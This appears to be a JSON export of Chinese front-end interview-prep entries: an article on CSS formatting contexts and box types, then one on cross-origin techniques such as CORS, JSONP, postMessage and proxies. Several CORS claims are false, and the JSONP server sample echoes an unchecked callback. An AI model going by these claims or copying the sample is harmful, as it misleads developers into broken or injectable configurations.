大多数元素只生成一个主块级盒子。\n\n主块级盒子包含由后代元素生成的盒子以及内容，同时也会参与定位方案。一个块级盒子可能也是一个块容器盒子。块容器盒子（Block Container Box）要么只包含其他块级盒子，要么只包含行内盒子并同时创建一个行内格式化上下文（Inline Formatting Context，俗称**IFC**）。\n\n注意，**块级盒子与块容器盒子是不同的**，这一点很重要。块级盒子描述了元素与其父元素和兄弟元素之间的行为；块容器盒子描述了元素跟其后代之间的行为。这些块级盒子并不是块容器盒子，比如`table`；而有些块容器盒子也不是块级盒子，比如非替换行内块和非替换表格单元格。\n\n如果一个盒子同时**既是块容器盒子又是块级盒子**的话，该盒子被称为**块盒子（Block Box）** 。\n\n![](https://static.ecool.fun//article/6683aa45-b0bb-47e7-86c8-fabeb2a9740f.)\n\n前面我们提到过各种块、盒子和元素这样的术语。那么这里我们简单的理一理**块（Block）** 、**包含块（Containing Block）** 、**盒子（Box）** 、**块级盒子（Block-level Box）** 、**块盒子（Block Box）** 、**块容器盒子（Block Containning Box）** 和**块级元素（Block-level Element）** 之间的关系：\n\n-   元素`display`的值为`block`、`list-item`、`table`、`flex`和`grid`时，该元素会生成一个**块级元素（Block-level Element）**\n    \n-   块级元素（Block-level Element）会生成一个**块级盒子（Block-level Box）**\n    \n-   块级盒子会参与**块格式化上下文（BFC）** 的创建\n    \n-   块级盒子（Block-level Element）描述了元素与其父元素和兄弟元素之间的行为\n    \n-   **块容器盒子（Block Containning Box）** 描述了元素跟其后代之间的行为。要么只包含**块级盒子（Block-level Box）** ，要么只包含**行内级盒子（Inline-level Box）** 。有的块容器盒子不是**块级盒子**，同样块级盒子有时也不是块容器盒子\n    \n-   同时是**块级盒子（Block-level Box）** 和**块容器盒子（Block Containning Box）** 的盒子被称作是**块盒子（Block Box）**\n    \n-   除此之外，还有**匿名块盒子（Anonymous Block Box）** （稍后介绍）\n    \n\n比如下面这样的一个示例：\n\n![](https://static.ecool.fun//article/f530e3ed-00d8-4dbe-91b5-3dfe2c6916f9.)\n\n### **行内级元素和行内盒子**\n\nCSS的`display`有很多个属性值，当元素的`display`属性的值为`inline`、`inline-block`、`inline-table`、`inline-flex`或`inline-grid`时，该元素被称为行内级元素。显示时，它不会生成内容块，但是可以与其他行内级内容一起显示为多行。比如，包含多种格式内容（比如`strong`、`img`等）的段落`p`，就可以由行内级元素组成。\n\n行内级元素会生成行内级盒子，该盒子同时会参与行内格式化上下文（Inline Formatting Context）的创建。行内盒子既是行内级盒子，也是一个其内容参与创建其容器的行内格式化上下文的盒子，比如所有具有`display: inline`样式的非替换盒子。如果一个行内级盒子的内容不参与行内格式化下下文的创建，则称其为原子行内级盒子。而通过替换行内级元素或`display`值为`inline-block`、`inline-table`、`inline-flex`或`inline-grid`的元素创建的盒子不会像行内盒子一样可以被拆分为多个盒子。\n\n简单归纳一下：\n\n-   元素`display`的值为`inline`、`inline-block`、`inline-table`、`inline-flex`或`inline-grid`时，元素则为行内级元素（Inline-level Element）\n    \n-   行内级元素会生成行内级盒子（Inline-level Box），会参与IFC的创建\n    \n-   同样的，也会创建一个匿名行内盒子\n    \n\n### **匿名盒子**\n\n匿名盒子分为**块匿名盒子**和**行内匿名盒子**。在某些情况下进行视觉格式化时，需要添加一些增补性的盒子，这些盒子无法被CSS的选择器选中，而这种盒子被称为**匿名盒子（Anonymous Box）** 。\n\nCSS选择器不能作用于匿名盒子（Anonymous Box），所以无法设置样式。也就是说，此时所有可继承的CSS属性值都为`inherit`，而所有不可继承的CSS属性值都为`initial`。\n\n比如下面的示例，在`div`元素中包含了一个`p`元素，而且`p`元素前后直接有一段文本：\n\n```HTML\n<div>\n    我是直接文本\n    <p>我是块级元素，但是我的前后都不是</p>\n    我也是直接文本\n</div>\n```\n\n这个示例中的，`div`元素中的文本内容（`p`元素前后的**文本内容**）创建匿名块盒子，渲染出来的效果如下所示：\n\n![](https://static.ecool.fun//article/0a0515a6-2905-4ea0-8f27-fd4e9adebf7c.)\n\n上图中，红色框中的就是匿名块盒子。\n\n另一种会创建匿名块盒子的情况是一个行内盒子中包含一或多个块盒子。此时，包含块盒子的盒子会拆分为两个行内盒子，分别位于块盒子的前面和后面。块盒子前面的所有行内盒子会被一个匿名块盒子包裹，块盒子后面的行内盒子也是一样。因此，块盒子将成为这两个匿名块盒子的兄弟盒子。\n\n如果有多个块盒子，而它们中间又没有行内元素，则会在这些盒子的前面和后面创建两个匿名块盒子。\n\n比如下面这样的示例：\n\n```HTML\n<p>Some <em>inline</em> text <span>followed by a paragraph</span> followed by more inline text.</p>\n```\n\n所设`p`元素设置了`display: inline`，`span`的`display`为`block`。此时也会创建两个匿名块盒子：一个是`span`元素前面的文本，另一个是其之后的文本。\n\n类似于块盒子，CSS引擎有时候也会自动创建一些行内匿名盒子。常见的情况是CSS引擎会自动为直接包含在块盒子中的文本创建一个行内格式化上下文，在这种情况下，这些文本会被一个足够大的匿名行内盒子所包含。但是如果仅包含空格则有可能不会生成匿名行内盒子，因为空格有可能会由于 `white-space` 的设置而被移除，从而导致最终的实际内容为空。\n\n比如下面这个示例：\n\n```HTML\n<p><span>Hellow</span> W3cplus.com!</p>\n```\n\n在`<p>`元素中无任何块级元素，也没有元素显式设置`displa`为`block`、`table`、`flex`或`grid`，并且直接包含了文本内容，比如上例中的“**`W3cplus.com`**”文本。属于`p`元素的直接本文，这个时候CSS引擎会为其创建一个匿名行内盒。\n\n### **其他类型的盒子**\n\n除了上述说到的盒子，在CSS中还定义了几种内容模型，这些模型同样可以应用于元素。这些模型一般用来描述布局，它们可能会定义一些额外的盒子类型：\n\n-   **表格内容模型**：可能会创建一个表格包装器盒子和一个表格盒子，以及多个其他盒子如表格标题盒子等\n    \n-   **多列内容模型**：可能会在容器盒子和内容之间创建多个列盒子\n    \n-   **Flexbox内容模型**：可能会创建一个弹性盒子\n    \n-   **Grid内容模型**：可能会创建一个网格盒子\n    \n\n## **格式化上下文**\n\nCSS中的格式化上下文有很多种，除了大家熟悉的BFC、IFC之外还有由Flexbox布局创建的FFC和Grid布局创建GFC等。这些统称为CSS格式化上下文，也被称作**视觉格式化模型**。而CSS视觉格式化模型是用来处理文档并将它显示在视觉媒体上的机制。简单地说，就是用来**控制盒子的位置，即实现页面的布局**。\n\n格式化上下文也可以说是CSS视觉渲染中的一部分，其主要作用是**决定盒子模型的布局，其子元素将如何定位以及和其他元素的关系和相互作用**。那么理解CSS格式化上下文有助于我们掌握各类CSS布局的关键。\n\n### **行内格式化上下文**\n\n行内格式化上下文（Inline Formatting Context），简称**IFC**。主要用来规则行内级盒子的格式化规则。\n\nIFC的行盒的高度是根据包含行内元素中最高的实际高度计算而来。主要会涉及到CSS中的`font-size`、`line-height`、`vertical-align`和`text-align`等属性。\n\n行内元素从包含块顶端水平方向上逐一排列，水平方向上的 `margin`、`border`、`padding` 生效。行内元素在垂直方向上可按照顶部、底部或基线对其。\n\n当几个行内元素不能在一个单独的行盒中水平放置时，他们会被分配给两个或更多的(Vertically-stacked Line Box)垂直栈上的行盒，因此，一个段落是很多行盒的垂直栈。这些行盒不会在垂直方向上被分离（除非在其他地方有特殊规定），并且他们也不重叠。\n\n-   垂直方向上，当行内元素的高度比行盒要低，那么 `vertical-align` 属性决定垂直方向上的对齐方式。\n    \n-   水平方向上，当行内元素的总宽度比行盒要小，那么行内元素在水平方向上的分部由 `text-align` 决定。\n    \n-   水平方向上，当行内元素的总宽度超过了行盒，那么行内元素会被分配到多个行盒中去，如果设置了不可折行等属性，那么行内元素会溢出行盒。\n    \n-   行盒的左右两边都会触碰到包含块，而 `float` 元素则会被放置在行盒和包含快边缘的中间位置。\n    \n\n下面这些规则都会创建一个行内格式化上下文：\n\n-   IFC只有在一个**块级元素**中仅包含**行内级元素**时才会生成\n    \n-   内部的盒子会在不平方向，一个接一个的放置\n    \n-   这些盒子垂直方向的起点从包含块盒子的顶部开始\n    \n-   摆放这些盒子的时候，它们在水平方向上的`padding`、`border`和`margin`所占用的空间都会被考虑在内\n    \n-   在垂直方向上，这些盒子可能会以不同形式来对齐（`vertical-align`）\n    \n-   能把在一行上的盒子都完全包含在一行行盒（Line Box），行盒的宽度是由包含块和存在的浮动来决定\n    \n-   IFC中的行盒一般左右边都紧贴其包含块，但是会因浮动元素的存在发生变化。浮动元素会位于IFC与行盒之间，使得行盒宽度缩短\n    \n-   当行内级盒的总宽度小于包含它们的行盒时，其水平渲染规则则由`text-align`来确定\n    \n-   当行内盒超过行盒的宽度时，它会被分割成多个盒子，这些盒子被分布在多个行盒里。如果一个行内盒不能被分割，则会溢出行盒\n    \n\nIFC主要用于：\n\n-   行内元素按照 `text-align` 进行水平居中\n    \n-   行内元素撑开父元素高度，通过 `vertical-align` 属性进行垂直居中\n    \n\n### **块格式化上下文**\n\n块格式化上下文（Block Formatting Context，BFC） 是Web页面的可视化CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。\n\nBFC实际上就是页面中一块渲染区域，该区域与其他区域隔离开来。容器里面子元素不会影响到外部，外部的元素也不会影响到容器里的子元素。\n\nBFC 内部的盒子会从上至下一个接着一个顺序排列。BFC 内的垂直方向的盒子距离以 `margin` 属性为准，上下 `margin` 会叠加。每个元素的左侧最外层边界与包含块 BFC 的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。BFC 的区域不会与浮动元素的盒子折叠。BFC 的高度也会受到浮动元素的影响，浮动元素参与计算。\n\n下面这些规则可以创建一个BFC：\n\n-   根元素或包含根元素的元素\n    \n-   浮动元素（元素的 `float` 不是 `none`）\n    \n-   绝对定位元素（元素的 `position` 为 `absolute` 或 `fixed`）\n    \n-   行内块元素（元素的 `display` 为 `inline-block`）\n    \n-   表格单元格（元素的 `display`为 `table-cell`，HTML表格单元格默认为该值）\n    \n-   表格标题（元素的 `display` 为 `table-caption`，HTML表格标题默认为该值）\n    \n-   匿名表格单元格元素（元素的 `display`为 `table`、`table-row`、 `table-row-group`、`table-header-group`、`table-footer-group`（分别是HTML `table`、`row`、`tbody`、`thead`、`tfoot`的默认属性）或 `inline-table`）\n    \n-   `overflow` 值不为 `visible` 的块元素\n    \n-   `display` 值为 `flow-root` 的元素\n    \n-   `contain` 值为 `layout`、`content`或 `strict` 的元素\n    \n-   弹性元素（`display`为 `flex` 或 `inline-flex`元素的直接子元素）\n    \n-   网格元素（`display`为 `grid` 或 `inline-grid` 元素的直接子元素）\n    \n-   多列容器（元素的 `column-count` 或 `column-width` 不为 `auto`，包括 `column-count` 为 `1`）\n    \n-   `column-span` 为 `all` 的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中\n    \n\n块格式化上下文包含创建它的元素内部的所有内容。其主要使用：\n\n-   创建独立的渲染环境\n    \n-   防止因浮动导致的高度塌陷\n    \n-   防止上下相邻的外边距折叠\n    \n\n### **Flex格式化上下文**\n\nFlex格式化上下文（Flexbox Formatting Context）俗称**FFC**。当`display`取值为`flex`或`inline-flex`，将会创建一个Flexbox容器。该容器为其内容创建一个新的格式化上下文，即**Flex格式化上下文**。\n\n不过要注意的是，Flexbox容器不是块容器（块级盒子），下列适用于块布局的属性并不适用于Flexbox布局：\n\n-   多列中的`column-*`属性不适用于Flexbox容器\n    \n-   `float`和`clear`属性作用于Flex项目上将无效，也不会把让Flex项目脱离文档流\n    \n-   `vertical-algin`属性作用于Flex项目上将无效\n    \n-   `::first-line`和`::first-letter`伪元素不适用于Flexbox容器，而且Flexbox容器不为他们的祖先提供第一个格式化的行或第一个字母\n    \n\n### **Grid格式化上下文**\n\nGrid格式化上下文（Grid Formaatting Context），俗称**GFC**。和FFC有点类似，元素的`display`值为`grid`或`inline-grid`时，将会创建一个Grid容器。该完完全全器为其内容创建一个新的格式化上下文，即**Grid格式化上下文**。这和创建BFC是一样的，只是使用了网格布局而不是块布局。\n\n网格容器不是块容器，因此一些假定为块布局设计的属性并不适用于网格格式化上下文中。特别是：\n\n-   `float`和`clear`运用于网格项目将不会生效。但是`float`属性仍然影响网格完完全全器子元素上`display`的计算值，因为这发生在确定网格项目之前\n    \n-   `vertical-align`运用于网格项目也将不会生效\n    \n-   `::first-line`和`::first-letter`伪元素不适用于网格容器，而且网格容器不向它们社先提供第一个格式化行或第一个格式化字母\n    \n\n## **小结**\n\n这一章节中聊到的了CSS中各种术语，特别是各种盒子，足以让大家感到困惑，甚至是痛苦。希望这篇文章有关于这些术语的阐述能帮助大家减少一些许痛苦。另外，文章中除了介绍CSS中的各种术语之外，还给大家阐述了CSS的格式化模型。初学者对该概念都不以为然，而实际上，如果对CSS格式化模型了解不清楚的话，对于CSS布局就会碰到很多头痛的事情，甚至无法让你快速解决碰到布局的问题。\n\n如果你仔细阅读完了上面的内容，你可能会知道，CSS视觉格式化模型是各种格式化上下文的集合。不同的格式化上下文又决定了每个盒子的类型，以及盒子布局。虽然说CSS的视觉格式化模型和CSS的盒模型都是用来处理盒子的，但他们之间有本质性的区别：\n\n-   **CSS的盒模型是用来计算盒子大小尺寸**\n-   **CSS的格式化模型是用来决定盒子类型和用来计算盒子的位置**\n\n* * *\n\n> 原文： https://juejin.cn/post/7327835500013682751\n\n",
    "testPoint": "### 1. **视觉格式化模型的基本概念**\n   - **定义**：什么是视觉格式化模型？它如何影响元素的渲染和排列？\n   - **盒模型**：如何理解盒模型？如何描述内容区（content）、内边距（padding）、边框（border）和外边距（margin）的关系？\n\n### 2. **格式化上下文**\n   - **定义**：什么是格式化上下文（formatting context）？有哪些类型的格式化上下文？\n   - **常见格式化上下文**：\n      - **块级格式化上下文**（BFC）：如何触发 BFC？BFC 对浮动和清除浮动有何作用？\n      - **内联格式化上下文**（IFC）：内联元素是如何排列的？如何计算内联框的高度？\n   - **使用场景**：BFC 和 IFC 在解决布局问题时的应用场景有哪些？\n\n### 3. **块级和内联格式化**\n   - **块级格式化**：块级元素如何渲染？如何理解其占据一整行的特性？\n   - **内联格式化**：内联元素如何渲染？多个内联元素之间的间距如何计算？\n   - **内联块元素**：什么是内联块元素？它和块级元素、内联元素的区别是什么？\n\n### 4. **流体文档流**\n   - **文档流**：什么是标准文档流？元素的默认排列顺序是怎样的？\n   - **脱离文档流**：脱离文档流的元素（如 `position: absolute` 和 `float`）如何影响布局？\n   - **回流和重绘**：如何理解回流（reflow）和重绘（repaint）？如何减少不必要的回流和重绘？\n\n### 5. **浮动（Float）**\n   - **浮动的作用**：什么是浮动？如何使用 `float` 实现基本布局？\n   - **清除浮动**：浮动如何影响后续元素的布局？如何通过 `clear` 或 BFC 清除浮动带来的影响？\n   - **浮动的应用与问题**：在何种情况下使用浮动实现布局？浮动布局的局限性有哪些？\n\n### 6. **定位（Positioning）**\n   - **定位模式**：`static`、`relative`、`absolute`、`fixed` 和 `sticky` 的区别是什么？\n   - **脱离文档流的影响**：`absolute` 和 `fixed` 定位如何脱离文档流？如何控制它们的参照元素？\n   - **使用场景**：在什么情况下适合使用 `position: sticky` 实现固定效果？\n\n### 7. **层叠上下文（Stacking Context）**\n   - **定义**：什么是层叠上下文（stacking context）？如何理解层叠顺序？\n   - **创建层叠上下文**：哪些 CSS 属性会创建新的层叠上下文？例如 `position`、`z-index`、`opacity`。\n   - **层叠顺序**：多个元素的 `z-index` 如何决定它们的层叠顺序？如何解决层叠问题？\n\n### 8. **外边距合并（Margin Collapsing）**\n   - **定义**：什么是外边距合并？哪些情况下会发生合并？\n   - **应用场景**：在垂直布局中，如何避免或利用外边距合并？\n   - **避免外边距合并的方法**：如何通过触发 BFC、内嵌元素等方法防止外边距合并？\n\n### 9. **display 属性的影响**\n   - **不同 display 值的渲染效果**：`block`、`inline`、`inline-block`、`flex`、`grid` 等对元素的渲染和布局有何影响？\n   - **display: contents**：如何理解 `display: contents`？它的实际应用场景有哪些？\n   - **display: none**：`display: none` 与 `visibility: hidden` 的区别是什么？在实际应用中应该如何选择？\n\n### 10. **CSS 渲染流程**\n   - **渲染树的生成**：如何生成渲染树？CSS 的哪些属性会影响渲染树？\n   - **回流与重绘**：哪些操作会触发回流（layout）？如何减少回流和重绘，提升页面性能？\n   - **优化技巧**：如何利用 CSS 视觉格式化模型中的规则优化页面渲染性能？\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 22,
    "createAt": "2024-10-10T09:10:13.000Z",
    "updateAt": "2024-11-10T05:41:17.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "133": {
    "id": 133,
    "tagId": 12,
    "title": "跨域通信",
    "explanation": "## 什么是跨域\n\n在了解跨域之前，我们必须要了解一下同源策略。 跨域问题其实就是浏览器的同源策略造成的。\n\n### 同源策略\n\n同源策略限制了从同一个源加载的文档或脚本如何与另一个源的资源进行交互。这是浏览器的一个用于隔离潜在恶意文件的重要的安全机制。同源指的是：**协议**、**端口号**、**域名**必须一致。\n\n> **跨源资源共享**（\\[CORS\\]，或通俗地译为跨域资源共享）是一种基于 \\[HTTP\\] 头的机制，该机制通过允许服务器标示除了它自己以外的其他\\[源\\] （域、协议或端口），使得浏览器允许这些源访问加载自己的资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。在预检中，浏览器发送的头中标示有 HTTP 方法和真实请求中会用到的头。\n\n## 为什么会产生跨域\n\n下表给出了与 URL [wmq.com/dir/page.ht…](http://wmq.com/dir/page.html \"http://wmq.com/dir/page.html\") 的源进行对比的示例:\n\n| URL | 是否跨域 | 原因 |\n| --- | --- | --- |\n| [wmq.com/dir/page.ht…](http://wmq.com/dir/page.html \"http://wmq.com/dir/page.html\") | 同源 | 完全相同 |\n| [wmq.com/dir/inner/a…](http://wmq.com/dir/inner/another.html \"http://wmq.com/dir/inner/another.html\") | 同源 | 只有路径不同 |\n| [wmq.com/secure.html](https://wmq.com/secure.html \"https://wmq.com/secure.html\") | 跨域 | 协议不同 |\n| [wmq.com:81/dir/etc.htm…](http://wmq.com:81/dir/etc.html \"http://wmq.com:81/dir/etc.html\") | 跨域 | 端口不同 ( http:// 默认端口是80) |\n| [news.company.com/dir/other.h…](http://news.company.com/dir/other.html \"http://news.company.com/dir/other.html\") | 跨域 | 主机不同 |\n\n**同源策略：protocol（协议）、domain（域名）、port（端口）三者必须一致。**\n\n**同源政策主要限制了三个方面：**\n\n-   当前域下的 js 脚本不能够访问其他域下的 cookie、localStorage 和 indexDB。\n-   当前域下的 js 脚本不能够操作访问操作其他域下的 DOM。\n-   当前域下 ajax 无法发送跨域请求。\n\n源政策的目的主要是为了保证用户的信息安全，它只是对 js 脚本的一种限制，并不是对浏览器的限制，对于一般的 img、或者script 脚本请求都不会有跨域的限制，这是因为这些操作都不会通过响应结果来进行可能出现安全问题的操作。\n\n## 有哪些解决跨域的办法\n\n### CORS\n\n**CORS**: 通过设置服务器端的响应头来允许跨域请求。这需要在服务器端进行配置，以允许特定的来源访问资源。例如，在Node.js的Express框架中，可以使用以下代码来设置CORS：\n\n```js\nconst express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*'); // 允许所有来源访问\n  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept'); // 允许的请求头\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); // 允许的请求方法\n  next();\n});\n\n// 其他路由和中间件\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\n\n#### 减少OPTIONS请求次数\n\n在跨域请求中，浏览器会自动处理一些非简单请求的预检流程，这包括\"预检请求\"（也被称为CORS预检请求）和\"OPTIONS请求\"。预检请求是发起一个HTTP OPTIONS请求到服务器，以确认目标资源是否支持跨域。这种机制是为了兼容同源策略而产生的，但有时这种额外的请求会导致性能问题。\n\n为了减少这种非必要的 OPTIONS 请求次数，可以采取以下几种方法：\n\n**配置服务器**: 对服务器进行配置以允许来自特定来源的跨域请求。例如，在Node.js的Express框架中，可以使用以下代码来设置CORS响应头：\n\n```js\nconst express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*'); // 允许所有来源访问\n  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept'); // 允许的请求头\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); // 允许的请求方法\n  next();\n});\n\n// 其他路由和中间件\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n\n    \n```\n\n在这个例子中，我们添加了一个新的响应头`Access-Control-Allow-Methods`，其中包含了`GET, POST, PUT, DELETE`等简单请求方法，这样浏览器对于简单跨域请求就不会再发送预检请求了。\n\n#### CORS中Cookie相关问题\n\n在CORS中，Cookie是一个重要的安全特性。如果服务器端设置了允许跨域请求的响应头，那么客户端就可以在跨域请求中携带Cookie。但是，如果服务器端没有设置允许跨域请求的响应头，那么客户端就无法在跨域请求中携带Cookie。\n\n为了解决这个问题，可以在服务器端设置允许跨域请求的响应头，以允许客户端携带Cookie。例如，在Node.js的Express框架中，可以使用以下代码来设置CORS：\n\n```js\nconst express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*'); // 允许所有来源访问\n  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Cookie'); // 允许的请求头\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); // 允许的请求方法\n  next();\n});\n\n// 其他路由和中间件\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n\n```\n\n在这个例子中，我们添加了一个新的响应头`Access-Control-Allow-Headers`，其中包含了`Cookie`。这样，客户端就可以在跨域请求中携带Cookie了。\n\n也就是说上面两个问题的解决方法是一样的，都是通过在服务端设置添加一个新的响应头`Access-Control-Allow-Headers`\n\n### JSONP\n\n**jsonp**的原理就是利用`<script>`标签没有跨域限制，通过`<script>`标签src属性，发送带有callback参数的GET请求，服务端将接口返回数据拼凑到callback函数中，返回给浏览器，浏览器解析执行，从而前端拿到callback函数返回的数据。\n\n1）原生JS实现：\n\n```html\n<script>\n    var script = document.createElement('script');\n    script.type = 'text/javascript';\n    // 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数\n    script.src = 'http://www.domain1.com:8080/login?user=admin&callback=handleCallback';\n    document.head.appendChild(script);\n    // 回调执行函数\n    function handleCallback(res) {\n        alert(JSON.stringify(res));\n    }\n </script>\n```\n\n服务端返回如下（返回时即执行全局函数）：\n\n```js\nhandleCallback({\"success\": true, \"user\": \"admin\"})\n```\n\n2）Vue axios实现：\n\n```js\nthis.$http = axios;\nthis.$http.jsonp('http://www.domain2.com:8080/login', {\n    params: {},\n    jsonp: 'handleCallback'\n}).then((res) => {\n    console.log(res); \n})\n```\n\n后端node.js代码：\n\n```js\nvar querystring = require('querystring');\nvar http = require('http');\nvar server = http.createServer();\nserver.on('request', function(req, res) {\n    var params = querystring.parse(req.url.split('?')[1]);\n    var fn = params.callback;\n    // jsonp返回设置\n    res.writeHead(200, { 'Content-Type': 'text/javascript' });\n    res.write(fn + '(' + JSON.stringify(params) + ')');\n    res.end();\n});\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n```\n\n**JSONP的缺点：**\n\n-   具有局限性， 仅支持get方法\n-   不安全，可能会遭受XSS攻击\n\n## postMessage 跨域\n\npostMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：\n\n-   页面和其打开的新窗口的数据传递\n-   多窗口之间消息传递\n-   页面与嵌套的iframe消息传递\n-   上面三个场景的跨域数据传递\n\n用法：postMessage(data,origin)方法接受两个参数：\n\n-   **data**： html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。\n-   **origin**： 协议+主机+端口号，也可以设置为\"\\*\"，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为\"/\"。\n\n1）a.html：(domain1.com/a.html)\n\n```xml\n<iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"></iframe>\n<script>       \n    var iframe = document.getElementById('iframe');\n    iframe.onload = function() {\n        var data = {\n            name: 'aym'\n        };\n        // 向domain2传送跨域数据\n        iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com');\n    };\n    // 接受domain2返回数据\n    window.addEventListener('message', function(e) {\n        alert('data from domain2 ---> ' + e.data);\n    }, false);\n</script>\n```\n\n2）b.html：(domain2.com/b.html)\n\n```xml\n<script>\n    // 接收domain1的数据\n    window.addEventListener('message', function(e) {\n        alert('data from domain1 ---> ' + e.data);\n        var data = JSON.parse(e.data);\n        if (data) {\n            data.number = 16;\n            // 处理后再发回domain1\n            window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com');\n        }\n    }, false);\n</script>\n```\n\n### nginx代理跨域\n\nnginx代理跨域，实质和CORS跨域原理一样，通过配置文件设置请求响应头Access-Control-Allow-Origin…等字段。\n\n1）nginx配置解决iconfont跨域\n\n浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。\n\n```ini\nlocation / {\n  add_header Access-Control-Allow-Origin *;\n}\n```\n\n2）nginx反向代理接口跨域\n\n跨域问题：同源策略仅是针对浏览器的安全策略。服务器端调用HTTP接口只是使用HTTP协议，不需要同源策略，也就不存在跨域问题。\n\n实现思路：通过Nginx配置一个代理服务器域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域访问。\n\nnginx具体配置：\n\n```ini\n#proxy服务器\nserver {\n    listen       81;\n    server_name  www.domain1.com;\n    location / {\n        proxy_pass   http://www.domain2.com:8080;  #反向代理\n        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名\n        index  index.html index.htm;\n        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用\n        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*\n        add_header Access-Control-Allow-Credentials true;\n    }\n}\n```\n\n### nodejs 中间件代理跨域\n\nnode中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。\n\n**1）非vue框架的跨域**\n\n使用node + express + http-proxy-middleware搭建一个proxy服务器。\n\n-   前端代码：\n\n```csharp\nvar xhr = new XMLHttpRequest();\n// 前端开关：浏览器是否读写cookie\nxhr.withCredentials = true;\n// 访问http-proxy-middleware代理服务器\nxhr.open('get', 'http://www.domain1.com:3000/login?user=admin', true);\nxhr.send();\n```\n\n-   中间件服务器代码：\n\n```less\nvar express = require('express');\nvar proxy = require('http-proxy-middleware');\nvar app = express();\napp.use('/', proxy({\n    // 代理跨域目标接口\n    target: 'http://www.domain2.com:8080',\n    changeOrigin: true,\n    // 修改响应头信息，实现跨域并允许带cookie\n    onProxyRes: function(proxyRes, req, res) {\n        res.header('Access-Control-Allow-Origin', 'http://www.domain1.com');\n        res.header('Access-Control-Allow-Credentials', 'true');\n    },\n    // 修改响应信息中的cookie域名\n    cookieDomainRewrite: 'www.domain1.com'  // 可以为false，表示不修改\n}));\napp.listen(3000);\nconsole.log('Proxy server is listen at port 3000...');\n```\n\n**2）vue框架的跨域**\n\nnode + vue + webpack + webpack-dev-server搭建的项目，跨域请求接口，直接修改webpack.config.js配置。开发环境下，vue渲染服务和接口代理服务都是webpack-dev-server同一个，所以页面与代理接口之间不再跨域。\n\nwebpack.config.js部分配置：\n\n```yaml\nmodule.exports = {\n    entry: {},\n    module: {},\n    ...\n    devServer: {\n        historyApiFallback: true,\n        proxy: [{\n            context: '/login',\n            target: 'http://www.domain2.com:8080',  // 代理跨域目标接口\n            changeOrigin: true,\n            secure: false,  // 当代理某些https服务报错时用\n            cookieDomainRewrite: 'www.domain1.com'  // 可以为false，表示不修改\n        }],\n        noInfo: true\n    }\n}\n```\n\n### document.domain + iframe跨域\n\n此方案仅限主域相同，子域不同的跨域应用场景。实现原理：两个页面都通过js强制设置document.domain为基础主域，就实现了同域。\n\n1）父窗口：(domain.com/a.html)\n\n```ini\n<iframe id=\"iframe\" src=\"http://child.domain.com/b.html\"></iframe>\n<script>\n    document.domain = 'domain.com';\n    var user = 'admin';\n</script>\n```\n\n1）子窗口：(child.domain.com/a.html)\n\n```xml\n<script>\n    document.domain = 'domain.com';\n    // 获取父窗口中变量\n    console.log('get js data from parent ---> ' + window.parent.user);\n</script>\n```\n\n## location.hash + iframe跨域\n\n实现原理：a欲与b跨域相互通信，通过中间页c来实现。 三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。\n\n具体实现：A域：a.html -> B域：b.html -> A域：c.html，a与b不同域只能通过hash值单向通信，b与c也不同域也只能单向通信，但c与a同域，所以c可通过parent.parent访问a页面所有对象。\n\n1）a.html：(domain1.com/a.html)\n\n```xml\n<iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"></iframe>\n<script>\n    var iframe = document.getElementById('iframe');\n    // 向b.html传hash值\n    setTimeout(function() {\n        iframe.src = iframe.src + '#user=admin';\n    }, 1000);\n    \n    // 开放给同域c.html的回调方法\n    function onCallback(res) {\n        alert('data from c.html ---> ' + res);\n    }\n</script>\n```\n\n2）b.html：(.domain2.com/b.html)\n\n```ini\n<iframe id=\"iframe\" src=\"http://www.domain1.com/c.html\" style=\"display:none;\"></iframe>\n<script>\n    var iframe = document.getElementById('iframe');\n    // 监听a.html传来的hash值，再传给c.html\n    window.onhashchange = function () {\n     